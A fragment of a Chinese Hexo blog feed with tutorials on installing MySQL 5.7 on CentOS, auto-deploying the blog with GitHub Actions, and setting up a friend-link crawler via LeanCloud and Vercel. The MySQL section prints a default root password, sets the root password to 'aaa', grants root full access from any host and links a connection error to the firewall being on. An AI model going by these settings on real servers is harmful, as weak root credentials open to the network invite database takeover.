class="meta">#</span><span class="bash">默认密码在mysqld.log日志里, 找到后保存到安全的地方：</span></span><br><span class="line">cat /var/log/mysqld.log</span><br><span class="line"><span class="meta">#</span><span class="bash">其中root@localhost: 后面的就是默认密码,后面登录用（D;J.ogLj8ETr）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">进入bin目录:</span></span><br><span class="line">cd /usr/local/mysql/bin/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">登录mysql:</span></span><br><span class="line">./mysql -u root -p #之后会提示输入刚才看到的默认密码</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">输入mysql相关命令，会提示你修改用户密码（注意后面mysql命令一定要加“;”）。</span></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">密码修改为 aaa</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> password=password(<span class="string">&quot;aaa&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">再次输入mysql相关命令</span></span><br><span class="line">show databases; #此时会成功看到默认的数据库表</span><br></pre></td></tr></table></figure></li><li><p>设置远程登录权限(<code>在mysql里面设置</code>)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;aaa&#39;;</span><br><span class="line"></span><br><span class="line">#刷新登录权限:</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line"></span><br><span class="line">#退出quit 或者 exit</span><br><span class="line">mysql&gt; quit;</span><br></pre></td></tr></table></figure></li><li><p>开机服务启动设置(之后开机自动启动)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把support-files/mysql.server 拷贝为/etc/init.d/mysql：</span></span><br><span class="line">cp -a /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否成功：（名字为mysql）</span></span><br><span class="line">cd /etc/init.d/</span><br><span class="line">ll</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看mysql服务是否在服务配置中</span></span><br><span class="line">chkconfig --list mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">若没有，则把mysql注册为开机启动的服务，然后在进行查看</span></span><br><span class="line">chkconfig --add mysql</span><br><span class="line">chkconfig --list mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">启动 或 停止</span></span><br><span class="line">service mysql start</span><br><span class="line">service mysql stop</span><br><span class="line"><span class="meta">#</span><span class="bash">当发现不能停止服务时，可以查看进程id，并通过进程id强制杀死服务进程</span></span><br></pre></td></tr></table></figure></li><li><p>创建快捷方式，服务启动后，直接运行mysql -u root -p即可登录，不需要进入到对应的目录。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /usr/local/mysql/bin/mysql /usr/bin</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>若使用Navicat 远程连接数据库时会出现（2003）<br>说明你的防火墙没有关。</p></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> 云服务器java环境部署 </category>
          
          <category> Linux(CentOS 7.6) </category>
          
          <category> MySQL5.7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云服务器java环境部署 </tag>
            
            <tag> Linux(CentOS 7.6) </tag>
            
            <tag> MySQL5.7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub Actions 自动部署博客</title>
      <link href="2021/11/11/GitHub%20Actions%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/"/>
      <url>2021/11/11/GitHub%20Actions%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>GitHub Actions 自动部署博客</p><p class='p center small'>Butterfly主题魔改教程，GitHub Actions 自动部署博客。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/f752c86d/">Akilarの糖果屋的《使用 Github Action 实现全自动部署》</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>每次部署 <code>Hexo</code> 都需要运行指令三件套，随着文章越来越多，编译的时间也随之越来越长，通过 <code>Github Action</code>，我们只需要在每次完成博客的编写或修改以后，将改动直接 <code>push</code> 到远程仓库，之后的编译部署的工作统统交给 <code>CI</code> 来完成即可。</p><ul><li>什么是<code>Github Action</code>呢？</li></ul><p><a href="https://github.com/features/actions">Github Action</a> 是 GitHub 于 2018 年 10 月推出的一个 CI\CD 服务。</p><ul><li>什么是CI/CD 解释呢？</li></ul><p>CI\CD 其实说的是三件事情：「持续集成（<code>Continuous Integration</code>）」、「持续交付（<code>Continuous Delivery</code>）」、「持续部署（<code>Continuous Deployment</code>）」。<br>因为「持续交付」和「持续部署」的英文缩写是一样的，所以这三件事情缩写成了 <code>CI\CD</code> 。</p><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2.步骤"></a>2.步骤</h1><h2 id="2-1获取-Token"><a href="#2-1获取-Token" class="headerlink" title="2.1获取 Token"></a>2.1获取 Token</h2><p>为了确保交由 <code>Github Action</code> 来持续部署时，<code>Github Action</code> 具备足够的权限来进行 <code>hexo deploy</code> 操作，需要先获取 <code>Token</code>。</p><ol><li>访问 <a href="https://github.com/settings/tokens">Github-&gt; 头像（右上角）-&gt;Settings-&gt;Developer Settings-&gt;Personal access tokens</a>-&gt;generate new token, 创建的 <code>Token</code> 名称随意，但必须勾选 repo 项。</li><li><code>token</code> 只会显示这一次，之后将无法查看，所以务必保证你已经记录下了 <code>Token</code>。之后如果忘记了就只能重新生成重新配置了。</li></ol><h2 id="2-2创建存放源码的私有仓库"><a href="#2-2创建存放源码的私有仓库" class="headerlink" title="2.2创建存放源码的私有仓库"></a>2.2创建存放源码的私有仓库</h2><ol><li>我们需要创建一个用来存放 <code>Hexo</code> 博客源码的私有仓库 <code>[SourceRepo]</code>。</li><li>创建完成后，需要把博客的源码 <code>push</code> 到这里。首先获取远程仓库地址，此处虽然 <code>SSH</code> 和 <code>HTTPS</code> 均可。<code>SSH</code> 在绑定过 <code>ssh key</code> 的设备上无需再输入密码，<code>HTTPS</code> 则需要输入密码，但是 <code>SSH</code> 偶尔会遇到端口占用的情况。请自主选择。</li></ol><div class="tip "><p>这里之所以是私有仓库，是因为在接下来的配置中会用到 <code>Token</code>，如果 <code>Token</code> 被盗用，别人可以肆意操作你的 github 仓库内容，为了避免这一风险，才选择的博客源码闭源。</p></div><h2 id="2-3配置-deploy-项"><a href="#2-3配置-deploy-项" class="headerlink" title="2.3配置 deploy 项"></a>2.3配置 deploy 项</h2><ol><li><p>打开站点配置文件 <code>[Blogroot]/_config.yml</code>, 找到 <code>deploy</code> 配置项，使用之前生成的 <code>[SiteToken]</code> 和各个站点仓库 <code>URL</code> 来组装地址。</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span></span><br><span class="line">    <span class="attr">gitHub:</span> <span class="string">https://[GithubUsername]:[GithubToken]@github.com/[GithubUsername]/[GithubBlogRepo].git[,branch]</span></span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://[GiteeUsername]:[GiteeToken]@gitee.com/[GiteeUsername]/[GiteeBlogRepo].git[,branch]</span></span><br><span class="line">    <span class="attr">coding:</span> <span class="string">https://[TokenUser]:[CodingToken]@e.coding.net/[CodingUsername]/[CodingBlogRepo].git[,branch]</span></span><br><span class="line">  <span class="comment"># [,branch]为可选项，表示部署的分支</span></span><br><span class="line">  <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="2-4配置-Github-Action"><a href="#2-4配置-Github-Action" class="headerlink" title="2.4配置 Github Action"></a>2.4配置 Github Action</h2><p>在 <code>[Blogroot]</code> 新建<code>.github</code> 文件夹，注意开头是有个<code>.</code> 的。然后在<code>.github</code> 内新建 <code>workflows</code> 文件夹，再在 <code>workflows</code> 文件夹内新建 <code>autodeploy.yml</code>, 在 <code>[Blogroot]/.github/workflows/autodeploy.yml</code> 里面输入</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当有改动推送到master分支时，启动Action</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">自动部署</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">release:</span></span><br><span class="line">    <span class="attr">types:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">published</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">检查分支</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">ref:</span> <span class="string">master</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Node</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">export</span> <span class="string">TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">缓存</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/cache@v1</span></span><br><span class="line">      <span class="attr">id:</span> <span class="string">cache</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">        <span class="attr">key:</span> <span class="string">$&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;**/package-lock.json&#x27;)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装依赖</span></span><br><span class="line">      <span class="attr">if:</span> <span class="string">steps.cache.outputs.cache-hit</span> <span class="type">!=</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">--save</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">生成静态文件</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">部署</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">&quot;[GithubUsername]&quot;</span></span><br><span class="line">        <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">&quot;[GithubEmail]&quot;</span></span><br><span class="line">        <span class="string">git</span> <span class="string">clone</span> <span class="string">https://github.com/[GithubUsername]/[GithubBlogRepo].git</span> <span class="string">.deploy_git</span></span><br><span class="line">        <span class="comment"># 此处务必用HTTPS链接。SSH链接可能有权限报错的隐患</span></span><br><span class="line">        <span class="comment"># =====注意.deploy_git前面有个空格=====</span></span><br><span class="line">        <span class="comment"># 这行指令的目的是clone博客静态文件仓库，防止Hexo推送时覆盖整个静态文件仓库，而是只推送有更改的文件</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><h2 id="2-5重新设置远程仓库和分支"><a href="#2-5重新设置远程仓库和分支" class="headerlink" title="2.5重新设置远程仓库和分支"></a>2.5重新设置远程仓库和分支</h2><ol><li><p>删除或者先把 <code>[Blogroot]/themes/butterfly/.git</code> 移动到非博客文件夹目录下，原因是主题文件夹下的<code>.git</code> 文件夹的存在会导致其被识别成子项目，从而无法被上传到源码仓库。</p></li><li><p>在博客根目录 <code>[Blogroot]</code> 路径下运行指令</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init <span class="comment">#初始化</span></span><br><span class="line">git remote add origin git@github.com:[GithubUsername]/[SourceRepo].git <span class="comment">#[SourceRepo]为存放源码的github私有仓库</span></span><br><span class="line">git checkout -b master <span class="comment"># 切换到master分支，</span></span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"><span class="comment"># 如果不是，后面的所有设置的分支记得保持一致</span></span><br></pre></td></tr></table></figure></li><li><p>添加屏蔽项<br> 因为能够使用指令进行安装的内容不包括在需要提交的源码内，所有我们需要将这些内容添加到屏蔽项，表示不上传到 github 上。这样可以显著减少需要提交的文件量和加快提交速度。<br> 打开 <code>[Blogroot]/.gitignore</code>, 输入以下内容：</p> <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.deploy_git*/</span><br><span class="line">.idea</span><br><span class="line">themes/butterfly/.git</span><br></pre></td></tr></table></figure></li><li><p>之后再运行 git 提交指令，将博客源码提交到 github 上。</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;github action update&quot;</span></span><br><span class="line">git push origin master</span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br></pre></td></tr></table></figure></li><li><p>此时你的主题文件夹若已经被正常上传，并且你也添加了主题文件夹下的.git 文件夹的屏蔽项。那你可以考虑把第二步移走或删除的<code>.git</code> 放回来，用作以后升级。（不禁怀疑真的有人会去用这个方式来升级吗）</p></li></ol><h2 id="2-6查看部署情况"><a href="#2-6查看部署情况" class="headerlink" title="2.6查看部署情况"></a>2.6查看部署情况</h2><ol><li>此时，打开 GIthub 存放源码的私有仓库，找到 <code>Action</code>。</li><li>根据刚刚的 Commit 记录找到相应的任务。</li><li>点击 <code>Deploy</code> 查看部署情况。</li><li>若全部打钩，恭喜你，你现在可以享受自动部署的快感了。</li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加朋友圈</title>
      <link href="2021/11/10/%E6%B7%BB%E5%8A%A0%E6%9C%8B%E5%8F%8B%E5%9C%88/"/>
      <url>2021/11/10/%E6%B7%BB%E5%8A%A0%E6%9C%8B%E5%8F%8B%E5%9C%88/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>添加朋友圈</p><p class='p center small'>Butterfly主题魔改教程，添加朋友圈。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://noionion.top/47095.html">贰猹の小窝的《友链朋友圈 3.0 食用说明书》</a>和<a href="https://akilar.top/posts/62f13a97/">Akilarの糖果屋的《hexo-filter-fcircle》</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>友链朋友圈的后端运行由 3 部分组成，涉及 2 个仓库、3 个平台，难免感觉有些繁琐。</p><p>后端运行步骤为：</p><p>gh action 爬虫抓取友链文章并作基本处理，推送至 leancloud → vercel 获取 leancloud 数据后进行二次处理后生成 api</p><p>而前端只需要再对 api 返回的 json 数据做一次排序即可</p><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2.步骤"></a>2.步骤</h1><h2 id="2-1后端部署配置"><a href="#2-1后端部署配置" class="headerlink" title="2.1后端部署配置"></a>2.1后端部署配置</h2><h3 id="2-1-1leancloud-数据库搭建"><a href="#2-1-1leancloud-数据库搭建" class="headerlink" title="2.1.1leancloud 数据库搭建"></a>2.1.1leancloud 数据库搭建</h3><ol><li><p>前往 <a href="https://leancloud.app/">leancloud 国际版官网（推荐国际版）</a>注册账号并登录。</p></li><li><p>前往<a href="https://console.leancloud.app/apps">控制台</a>新建应用，应用名称无限制</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801163918.png" alt=""></p></li><li><p>进入应用中，点击 <code>设置</code> -&gt; <code>应用凭证</code>，记录 <code>AppID</code> 和 <code>AppKet</code> 即可。(之后两步部署均会使用到)</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801164344.png" alt=""></p></li></ol><h3 id="2-1-2github-爬虫仓库部署及配置项说明"><a href="#2-1-2github-爬虫仓库部署及配置项说明" class="headerlink" title="2.1.2github 爬虫仓库部署及配置项说明"></a>2.1.2github 爬虫仓库部署及配置项说明</h3><ol><li><p><code>fork</code> 友链朋友圈的项目仓库 <a href="https://github.com/Rock-Candy-Tea/hexo-circle-of-friends">https://github.com/Rock-Candy-Tea/hexo-circle-of-friends</a></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801165944.png" alt=""></p></li><li><p>点击 fork 后的仓库的 <code>Settings</code> -&gt; <code>Secrets</code> -&gt; <code>New repository secret</code>创建环境变量。</p><p> Name 分别为： <code>APPID</code>、<code>APPKEY</code>、<code>LINK</code> ；</p><p> Value 分别填入刚刚保存 Leancloud 的<code>应用 ID（AppID）</code>和<code>应用密钥（AppKey）</code>以及<code>你的友链链接</code>（例如 <a href="https://noionion.top/link/）；">https://noionion.top/link/）；</a></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801170342.png" alt="配置变量 1"></p><p> 配置变量 1</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801170853.png" alt="配置变量 2"></p><p> 配置变量 2</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801171155.png" alt="配置变量 3"></p><p> 配置变量 3</p></li><li><p>启用友链朋友圈的 github action，点击 <code>fork</code> 后的仓库的 <code>Actions</code> -&gt; <code>I understand my workflows, go ahead and enable them</code></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801171531.png" alt=""></p></li><li><p>之后点击 <code>update-friends-posts</code> 并启用 <code>workflow</code></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801172346.png" alt=""></p></li><li><p>之后点击仓库 <code>star</code> 来完成第一次程序运行，不出意外的话结果如下图</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801173106.png" alt=""></p></li><li><p>这时你应该能在 leancloud 上看到上传的数据啦（除非你不是已经适配的主题，在配置项中会有相应解决办法），此后在每天的 8,12,17,22 点各会有两次自动更新爬取。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801173224.png" alt=""></p></li><li><p>编辑仓库中的 setting.py 文件，需要用户自行编辑的仅如下几项（<code>使用了GitHub Action自动更新友链的才需要配置如下配置项</code>）。对于非已适配主题的 hexo 用户（无 github 和 gitee 友链）和非 hexo 用户，请将友链自行按格式添加到 CONFIG_FRIENDS_LINKS[‘list’] 中并启用它。（这是目前通用化的一种方式，如果是 hexo 用户希望适配自己的主题，请提交 issue）</p> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">功能 设置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># github友链配置</span></span><br><span class="line">GITHUB_FRIENDS_LINKS = &#123;</span><br><span class="line">    <span class="string">&quot;enable&quot;</span>: <span class="literal">False</span>,    <span class="comment"># True 开启gitee issue兼容</span></span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;normal&quot;</span>,  <span class="comment"># volantis用户请在这里填写 volantis</span></span><br><span class="line">    <span class="string">&quot;owner&quot;</span>: <span class="string">&quot;Zfour&quot;</span>,  <span class="comment"># 填写你的github用户名</span></span><br><span class="line">    <span class="string">&quot;repo&quot;</span>: <span class="string">&quot;zfour-friends&quot;</span>,  <span class="comment"># 填写你的github仓库名</span></span><br><span class="line">    <span class="string">&quot;state&quot;</span>: <span class="string">&quot;open&quot;</span>  <span class="comment"># 填写抓取的issue状态(open/closed)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># gitee友链配置</span></span><br><span class="line">GITEE_FRIENDS_LINKS = &#123;</span><br><span class="line">    <span class="string">&quot;enable&quot;</span>: <span class="literal">False</span>,    <span class="comment"># True 开启gitee issue兼容</span></span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;normal&quot;</span>,  <span class="comment"># volantis用户请在这里填写 volantis</span></span><br><span class="line">    <span class="string">&quot;owner&quot;</span>: <span class="string">&quot;Zfour&quot;</span>,  <span class="comment"># 填写你的github用户名</span></span><br><span class="line">    <span class="string">&quot;repo&quot;</span>: <span class="string">&quot;zfour-friends&quot;</span>,  <span class="comment"># 填写你的github仓库名</span></span><br><span class="line">    <span class="string">&quot;state&quot;</span>: <span class="string">&quot;open&quot;</span>  <span class="comment"># 填写抓取的issue状态(open/closed)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏蔽站点</span></span><br><span class="line">BLOCK_SITE = [</span><br><span class="line">    <span class="string">&quot;https://example.com/&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;https://blog.cyfan.top/&#x27;</span> <span class="comment"># 这位朋友伪造了atom不让抓咱也没办法</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 友链列表配置文件</span></span><br><span class="line">CONFIG_FRIENDS_LINKS = &#123;</span><br><span class="line">    <span class="string">&quot;enable&quot;</span>: <span class="literal">False</span>, <span class="comment"># 是否启用配置项友链 True/False（此项用于针对还未适配的主题用户）</span></span><br><span class="line">    <span class="string">&quot;list&quot;</span>:[</span><br><span class="line">        <span class="comment"># 格式：[&quot;name&quot;, &quot;link&quot;, &quot;avatar&quot;]，除最后一行外每行后面加&quot;,&quot;，&quot;[]&quot;不可省略</span></span><br><span class="line">        <span class="comment"># link的结尾最好加上&#x27;/&#x27;</span></span><br><span class="line">        <span class="comment"># 例如：</span></span><br><span class="line">        [<span class="string">&quot;贰猹の小窝&quot;</span>, <span class="string">&quot;https://noionion.top/&quot;</span>, <span class="string">&quot;https://pub-noionion.oss-cn-hangzhou.aliyuncs.com/head.jpg&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;小冰博客&quot;</span>, <span class="string">&quot;https://zfe.space/&quot;</span>, <span class="string">&quot;https://zfe.space/images/headimage.png&quot;</span>]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-1-3vercel-无服务器-API-部署"><a href="#2-1-3vercel-无服务器-API-部署" class="headerlink" title="2.1.3vercel 无服务器 API 部署"></a>2.1.3vercel 无服务器 API 部署</h3><ol><li><p>前往<a href="https://vercel.com/ ">vercel 官网</a> ，直接用 github 创建账号并用手机号绑定（其实前端直接调用 leancloud 的数据也可以获取信息，但会暴露你的 AppID 和 AppKey，所以套一层 vercel 作为 api 较为安全）</p></li><li><p>点击 <code>New Project</code> 新建项目</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801201836.png" alt=""></p></li><li><p>点击 <code>Import Third-Party Git Repository</code>，输入 <code>https://github.com/Rock-Candy-Tea/hexo-friendcircle-api</code>。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801202209.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801202323.png" alt=""></p></li><li><p>然后点击 <code>github</code>，输入仓库名（无限制），生成 api 仓库。（此步骤会在 github 生成一个 api 仓库（不用理它，但也不要删除））</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801202456.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801202724.png" alt=""></p></li><li><p>下一步骤 <code>Create a Team</code> 跳过 (Skip) 即可，等它构建完后点击 <code>Go to Dashboard</code> 即可</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801203028.png" alt=""></p></li><li><p>点击项目 <code>Settings</code> -&gt; <code>Environment Variables</code>，在如图框中输入密钥，Name 分别以 <code>LEANCLOUD_ID</code>、<code>LEANCLOUD_KEY</code> 创建环境变量。<br> Value 分别填入刚刚保存 Leancloud 的<code>应用 ID（AppID）</code>和<code>应用密钥（AppKey）</code>。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801211034.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801211552.png" alt=""></p></li><li><p>回到项目首页，点击 <code>View Build Logs</code> 后在 Visit 左侧的选择框中点击 <code>Redeploy</code> 即可</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801204242.png" alt=""></p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801204746.png" alt=""></p></li><li><p>回到上一页，点击 <code>visit</code> 后，在网址后面加上 <code>/api</code> 访问 api，如 <code>https://hexo-friendcircle3-api.vercel.app/api</code>，出现数据即为部署成功</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.7/tianjiapengyouquan/20210801204926.png" alt=""></p></li></ol><h2 id="2-2前端部署配置"><a href="#2-2前端部署配置" class="headerlink" title="2.2前端部署配置"></a>2.2前端部署配置</h2><h3 id="2-2-1hexo-插件安装版"><a href="#2-2-1hexo-插件安装版" class="headerlink" title="2.2.1hexo 插件安装版"></a>2.2.1hexo 插件安装版</h3><ol><li><p>安装插件，在博客根目录 <code>[Blogroot]</code> 下打开终端，运行以下指令（与旧版前端方案不兼容，如有安装旧版请先卸载）：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-butterfly-fcircle --save</span><br><span class="line">npm install hexo-filter-fcircle --save</span><br></pre></td></tr></table></figure></li><li><p>添加配置信息<br> 在站点配置文件<code>_config.yml</code> 或者主题配置文件例如<code>_config.butterfly.yml</code> 中添加</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fcircle</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/8480b91c/</span></span><br><span class="line"><span class="attr">fcircle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制开关</span></span><br><span class="line">  <span 